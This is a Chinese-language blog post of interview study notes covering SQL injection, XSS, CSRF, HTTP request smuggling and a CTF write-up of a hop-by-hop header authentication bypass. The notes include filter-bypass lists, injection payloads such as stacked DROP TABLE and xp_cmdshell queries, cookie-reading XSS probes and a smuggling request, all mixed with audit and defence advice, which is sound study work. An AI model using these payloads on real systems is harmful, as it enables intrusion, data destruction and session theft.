---
layout: post
title: 用八十岁老奶也能听懂的话总结了面试常用的Web安全漏洞
date: 2025-12-20
categories: [安全, 面试]
tags: [Web安全, 面试, SQL注入, XSS, CSRF, SSRF, XXE, 安全漏洞]
toc: true
author: GyroJ
---

> 面向 **后端 / 安全 / 开发岗面试**
> SQL 注入、PDO、CORS、XSS、CSRF、SSRF、XXE、本地/横向提权。
> 计划长期更新,这算是一本《永乐大典》吗？

---

## SQL注入

### 知识点收集整理
布尔盲注、时间盲注、二次注入、错误注入、如何使用sqlmap、如何进行fuzz

#### SQL语句的几种类型（从攻击者角度思考

DQL/DML，通常是单个参数查询或者设置，比如SELECT，INSERT，UPDATE，最简单的注入，可以通过ORM或者预输入处理来进行防护，但是防不住ORDER BY

DDL/DCL, 只能通过最小权限原则、黑白名单来处理



>ORM（Object Relational Mapping）通过对象模型映射关系数据库，自动生成 SQL 并负责参数绑定。你不再手写 SQL，而是用代码操作"对象"，ORM 帮你安全地拼 SQL。

---
### 一些绕过方式：

空格绕过
- `/**/` - 注释符
- `%09` - Tab
- `%0a` - 换行
- `%0d` - 回车
- `()` - 括号
- `+` - 加号

引号绕过
- `0x616461696e` - 十六进制
- `CHAR(97,100,109,105,110)` - CHAR函数
- `CONCAT()` - 字符串拼接
- `%df'` - 宽字节注入

关键字绕过
- `SeLeCt` - 大小写混淆
- `selselectect` - 双写
- `SEL/**/ECT` - 内联注释
- `/*!50000SELECT*/` - 版本注释
- `%53%45%4c%45%43%54` - URL编码

逻辑运算符
- `&&` - 替代AND
- `||` - 替代OR
- `LIKE` - 替代=
- `IN()` - 替代=
- `BETWEEN` - 替代=
- `REGEXP` - 正则匹配

函数替换
- `SUBSTR / MID / LEFT / RIGHT` - 字符串截取
- `IF / CASE WHEN` - 条件判断
- `BENCHMARK` - 替代SLEEP
- `GET_LOCK` - 延时函数

等价函数
- `@@version` - 替代version()
- `schema()` - 替代database()
- `current_user()` - 替代user()
- `||` / `+` - 字符串连接

参数污染
- `id=1&id=2` - 多个同名参数
- 测试取第一个/最后一个/拼接

编码绕过
- `%27` - URL编码
- `%2527` - 双重URL编码
- `%u0027` - Unicode
- `&#39;` - HTML实体
- `Base64`

宽字节注入
- `%df'` - GBK编码
- `%a1'` - Big5编码
- `%81'` - Shift-JIS

堆叠查询
- `;DROP TABLE` - 多语句执行
- `;UPDATE` - 修改数据
- `;EXEC xp_cmdshell` - 命令执行

二次注入
- 第一步：插入恶意数据（被转义）
- 第二步：查询时触发（未转义）

时间盲注
- `SLEEP(5)` - MySQL
- `BENCHMARK()` - MySQL替代
- `WAITFOR DELAY` - SQL Server
- `pg_sleep()` - PostgreSQL
- `DBMS_LOCK.SLEEP` - Oracle



报错注入
 MySQL
- `updatexml()`
- `extractvalue()`
- `floor(rand()*2)`
- `exp()`
- `GeometryCollection()`

 SQL Server
- `CONVERT(int, @@version)`

 Oracle
- `utl_inaddr.get_host_address()`
- `XMLType()`

 PostgreSQL
- `CAST(version() AS int)`

常用Payload
判断列数
```
' ORDER BY 1--
' ORDER BY 2--
```
 联合注入
```
' UNION SELECT 1,2,3--
' UNION SELECT null,database(),user()--
```
 布尔盲注
```
' AND 1=1--
' AND SUBSTRING(database(),1,1)='a'--
```
 时间盲注
```
' AND IF(1=1,SLEEP(5),0)--
```
 报错注入
```
' AND updatexml(1,concat(0x7e,database()),1)--
```

### 面试问题
1.给你一个java应用白盒测试，如何快速查找可能的SQL注入点
#### 查找方法

查找高危API
```java
Statement
createStatement
execute
executeQuery
executeUpdate
addBatch
```
```java
// 危险模式 - 字符串拼接
String sql = "SELECT * FROM users WHERE id=" + userId;
Statement stmt = conn.createStatement();
stmt.executeQuery(sql);

// 危险模式 - MyBatis ${}
<select id="getUser">
  SELECT * FROM users WHERE name = '${userName}'
</select>
```
统计用户输入源，可以顺便检查一下是否存在java反序列化漏洞
```java
request.getParameter()
@RequestParam
@RequestBody
@PathVariable
@ModelAttribute
```
#### 审计要点
- 搜索关键字：`Statement`、`executeQuery`、`executeUpdate`、`${}(MyBatis)`
- 检查用户输入是否直接拼接到SQL
- 确认是否使用`PreparedStatement`和`#{}`(MyBatis)
- 是否存在字符串拼接、是否有不可参数化的 SQL 结构，以及 ORM 被误用的场景，
尤其是 ORDER BY、动态条件和原生 SQL，这些地方在真实项目中最容易出问题

## XSS
### 危害

* 窃取 Cookie（非 HttpOnly）
* 劫持登录态
* 钓鱼、键盘记录
* 配合 CSRF / SSRF

简单 XSS 防护示例

```php
function xss_filter($input) {
    return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
}
```

> 不过滤输入，而是**在输出时做编码**


HttpOnly 为什么 JS 读不到 Cookie

```http
Set-Cookie: PHPSESSID=xxx; HttpOnly
```

* 浏览器禁止 `document.cookie` 访问
* 但 Cookie 仍会随请求发送

>👉 防 XSS 窃 Cookie，不防 CSRF

---
### XSS漏洞审计

#### 白盒审计
```java
// 危险代码模式
out.println("<div>" + userInput + "</div>");  // 未编码
response.getWriter().write(request.getParameter("name")); // 直接输出

// JSP中
<div>${param.name}</div>  <!-- JSTL默认转义，但某些情况例外 -->
<div><%=request.getParameter("name")%></div>  <!-- 危险 -->
```

**审计要点:**
- 和上面的SQL注入审计一样的方法论搜索：`getParameter`、`getAttribute`、输出函数
- 检查是否经过HTML编码：`StringEscapeUtils.escapeHtml4()`
- 检查富文本：是否使用白名单过滤（jsoup、OWASP AntiSamy）

### 黑盒审计
```bash
# 测试反射型XSS
http://target.com/search?q=<script>alert(1)</script>
http://target.com/page?name=<img src=x onerror=alert(1)>

# 测试存储型XSS
注册用户名: <svg/onload=alert(1)>
发表评论: "><script>alert(document.cookie)</script>

# 测试DOM-XSS
http://target.com/page#<img src=x onerror=alert(1)>
```
注意这里的#是重点，这个#，通俗的可以叫做锚点
#的作用：
不会发送到服务器：片段标识符（即#之后的内容）不会被包含在HTTP请求中。也就是说，当浏览器向服务器请求```http://target.com/page```时，#后面的部分不会发送到服务器，而是由客户端（浏览器）保留并使用。
客户端处理：由于片段标识符不会发送到服务器，因此服务器无法直接控制或访问它。它完全由客户端处理。这意味着，如果网页中的JavaScript代码读取了window.location.hash并进行了不安全的内嵌或执行，就可能导致安全问题（例如XSS）。
>检测工具: XSStrike、Burp Suite、AWVS
---

## CSRF
人话解释：CSRF就是我构造一个钓鱼网站，然后通过post提交表单到其他网站的api接口，此时浏览器自动带上了cookie，导致CSRF。
>***一些细节：CSRF 本质上只是利用浏览器发出请求，攻击者一般无法读取响应内容，这是由于浏览器同源策略的限制。***

详细一点解释：
CSRF 的产生源于浏览器对 Cookie 的自动携带机制，同源策略仅限制响应读取而不限制请求发送；SameSite Cookie 是现代防御核心，而一旦存在 XSS，CSRF 防护将被完全绕过；JSONP 则是历史上绕过同源策略、放大 CSRF 与信息泄露风险的典型设计缺陷。

#### 面试遇到的问题：为什么后端api使用json不能完全防住csrf
原理上出发：传统csrf是使用浏览器直接发送表单，不能发送json数据，如果要发送json数据，就必须要调取JS，但是调取JS的过程中受到CORS的阻碍

CSRF 并不是不能发送 JSON，而是在没有 XSS 的前提下，浏览器不允许跨站页面构造并发送携带 application/json 的请求；因此“JSON API 看起来不容易被 CSRF”是浏览器安全模型的副作用，而不是 JSON 自身的安全性。
<form> 的硬限制

HTML 表单 只能 发：
```
application/x-www-form-urlencoded
multipart/form-data
text/plain
```
Samesite的简单介绍：
```
a.example.com → b.example.com 是 same-site
evil.com → example.com 是 cross-site
```
1. ameSite=Strict（最严格）
只要是 cross-site 请求，一律不带 Cookie

2. SameSite=Lax（默认，最容易被误解）
行为规则（必须记住）
场景	是否带 Cookie
```python
same-site	                  ✅
cross-site GET（顶级导航）	  ✅
cross-site POST	                  ❌
<img> / <iframe>	          ❌
```
3. SameSite=None（最宽松）
所有请求都带 Cookie（只要 HTTPS + Secure）
>***JSON API 防 CSRF”的效果，其实是 SameSite=Lax 带来的副作用
SameSite 控制“带不带 Cookie”，CORS 控制“JS 能不能读响应”。***

##### 一句话总结
在跨站场景下，提交 JSON 的 POST 请求是否携带 Cookie，取决于 Cookie 的 SameSite 属性而非 JSON 本身；在 SameSite=Lax 或 Strict 下，浏览器会阻止携带 Cookie，从而使 JSON 型 CSRF 失效，而在 SameSite=None 下则不会。

绕过方法：在表单中提交参数text={json数据}，后端解析的时候有可能会将其解析为json
##### 补充
JSONP 是一种利用 `script` 标签绕过同源策略、允许跨域读取数据的历史方案；它本身不具备任何安全防护能力，也无法绕过 SameSite；在 SameSite=None 的情况下，JSONP 会自动携带 Cookie 并读取登录态数据，因此在现代安全实践中应当彻底禁用。

## HTTP相关漏洞
### http请求头走私
在反向代理架构中，如果前端代理与后端服务器对 Content-Length 与 Transfer-Encoding: chunked 的解析规则不一致，攻击者可构造畸形 HTTP 请求，使前端认为请求已结束，而后端继续解析剩余数据，从而将隐藏请求“走私”到后端，这种攻击称为 HTTP 请求走私。

可以用来绕过前端的WAF
### CVE-2020-11984（Apache HTTP Server）
在 Nginx 作为反向代理、Apache 作为后端的架构中，由于 Nginx 按 Content-Length 判断请求结束，而 Apache 按 Transfer-Encoding: chunked 解析请求体，攻击者可以构造歧义请求，在 Apache 中额外解析出被 Nginx 忽略的隐藏请求，从而形成 HTTP 请求走私漏洞，CVE-2020-11984 即是该类问题的典型代表。

```
Client
  ↓
Nginx 1.14.x / 1.16.x   （反向代理）
  ↓
Apache HTTPD 2.4.43     （应用服务器）
```

请求包示例：
```
POST / HTTP/1.1
Host: victim.com
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: victim.com
```
前端解释的过程中，优先看Content-Length，忽略了后面的 GET请求的一部分，绕过了前端的WAF，将两个请求包传送到后端，达成攻击。

防护措施：

前端反向代理和后端同时拒绝 CL + TE，必要时后端可以再加一层WAF

### HTTP RFC利用漏洞

#### 原理
RFC 是互联网协议的“法律文本”，规定了协议必须如何实现，所有合规实现都必须遵守。
RFC中有一句原话：
***A proxy MUST remove any header listed in the Connection header.***
出现在 Connection 头字段中的 header，都是 hop-by-hop。
其余未被声明为 hop-by-hop 的 header，默认都是 end-to-end。

hop by hop的header会被删除，删除的时间节点在HTTP 解析完成之后、转发请求生成之前

>***凡是被 Connection 声明过的字段，都不能转发***
#### 强网杯2025 Secret Vault
一个python的web app。flask。有个go的鉴权服务器。这个服务器有个后端，来自```github.com/gorilla/mux```，有一段签名逻辑，开在4444端口

go的鉴权服务器有个中间件。开在5555，会从主服务器（5000）中获取JWT密钥，验证并提取uid，然后删掉一些头：
```go
        req.Header.Del("Authorization")
        req.Header.Del("X-User")
        req.Header.Del("X-Forwarded-For")
        req.Header.Del("Cookie")
```
然后将X-User设置为uid。

客户机向主服务器（5000）交一段JWT的auth信息，通过过中间件处理后，会返回uid。如果中间件验证失败就是anonymous，也就是鉴权失败。

他这个主服务器上的鉴权：
```python
    def login_required(view_func):
        @wraps(view_func)
        def wrapped(*args, **kwargs):
            uid = request.headers.get('X-User', '0')
            print(uid)
            if uid == 'anonymous':
                flash('Please sign in first.', 'warning')
                return redirect(url_for('login'))
            try:
                uid_int = int(uid)
            except (TypeError, ValueError):
                flash('Invalid session. Please sign in again.', 'warning')
                return redirect(url_for('login'))
            user = User.query.filter_by(id=uid_int).first()
            if not user:
                flash('User not found. Please sign in again.', 'warning')
                return redirect(url_for('login'))

            g.current_user = user
            return view_func(*args, **kwargs)

        return wrapped
```
如果获取失败uid就是0，uid是0的用户正好是admin。
```
            user = User(
                id=0,
                username='admin',
                password_hash=password_hash,
                salt=base64.b64encode(salt).decode('utf-8'),
            )
```
所以我们现在就是要想个办法让中间件的返回头里没有 X-User
```go
func main() {
    authorizer := &httputil.ReverseProxy{Director: func(req *http.Request) {
        req.URL.Scheme = "http"
        req.URL.Host = "127.0.0.1:5000"

        uid := GetUIDFromRequest(req)
        log.Printf("Request UID: %s, URL: %s", uid, req.URL.String())
        req.Header.Del("Authorization")
        req.Header.Del("X-User")
        req.Header.Del("X-Forwarded-For")
        req.Header.Del("Cookie")

        if uid == "" {
            req.Header.Set("X-User", "anonymous")
        } else {
            req.Header.Set("X-User", uid)
        }
    }}
}
```
我们传入：
```
Connection: close,X-User
```
此时不管中间件传回怎样的X-User值，在客户机与中间件的Connection被Connection Header给close掉之后，也根据RFC HTTP1/1的规范（为了向下兼容）将X-User置空。因此我们得到了空的X-User。

在uid = request.headers.get('X-User', '0')中，我们得到了uid为0的用户的登录权限。
